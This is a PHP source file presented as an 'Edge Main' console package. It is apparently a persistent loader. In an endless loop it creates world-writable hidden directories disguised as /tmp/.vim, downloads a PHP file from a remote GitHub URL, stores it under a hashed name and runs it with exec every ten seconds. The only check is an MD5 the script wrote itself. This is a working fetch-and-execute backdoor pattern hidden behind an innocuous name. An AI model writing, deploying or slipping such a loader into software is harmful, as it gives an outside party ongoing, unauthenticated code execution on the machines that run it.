<?php

/**
 * Edge Main
 *
 * @category Console
 * @package  Main
 * @author   Glenn.R.Thomas <glenn.robert.thomas@gmail.com>
 * @license  Copyright (C) 2016 Glenn.R.Thomas. All Rights Reserved
 * @link     https://github.com/Glenn-robert
 */
class edge
{
    protected $hosts = array(
        'https://raw.githubusercontent.com/Glenn-robert/code/master/'
    );

    protected $functions = array(
        'information.php'
    );

    protected $tmpPath = array(
        '/tmp/.vim',
        '/tmp/.vim/.doc'
    );

    function __construct()
    {
        while (true) {
            $this->init();
            sleep(10);
        }
    }

    private function init()
    {
        /**
         * Check Tmp Directory
         */
        foreach ($this->tmpPath as $path) {
            if (!is_dir($path)) {
                $ret = mkdir($path, 0777);
                if (!$ret) {
                    $this->log('Make Directory Failed');
                }
            }
        }

        /**
         * Check File
         */
        foreach ($this->functions as $function) {
            foreach ($this->hosts as $host) {
                $url = $host . $function;
                $filenameMD5 = md5($url);
                $basePath = end($this->tmpPath);
                $filePath = $basePath . DIRECTORY_SEPARATOR . $filenameMD5;
                $fileMD5Path = $basePath . DIRECTORY_SEPARATOR . '.' . $filenameMD5;
                $this->log('Check Function:' . $function);
                $this->log('FilePath: ' . $filePath);
                $this->log('FileMD5Path: ' . $fileMD5Path);
                if (is_file($filePath) && is_file($fileMD5Path)) {
                    $fileContentMD5 = file_get_contents($fileMD5Path);
                    if ($fileContentMD5 == md5_file($filePath)) {
                        $this->log('MD5 Check Success: ' . $filePath);
                        $this->run($filePath);
                        break;
                    }
                }
                $this->log('File Not Exits, Downloading...');
                $content = file_get_contents($url);
                $retOriginFile = file_put_contents($filePath, $content);
                $retMD5File = file_put_contents($fileMD5Path, md5($content));
                if ($retOriginFile && $retMD5File) {
                    $this->log('Downloaded: ' . $function);
                    $this->run($filePath);
                } else {
                    $this->log('Download Failed: ' . $function);
                }
            }
        }
    }

    /**
     * Run
     *
     * @param $filePath
     * @return mixed
     */
    private function run($filePath)
    {
        exec('/usr/bin/php ' . $filePath, $output, $return);
        echo json_encode($output);
    }

    /**
     * Log
     *
     * @param $msg
     */
    private function log($msg)
    {
        echo $msg . PHP_EOL;
    }
}

error_reporting(-1);
// Limits the maximum execution time
set_time_limit(0);
ini_set('memory_limit', '2048M');
// Start
$edge = new edge();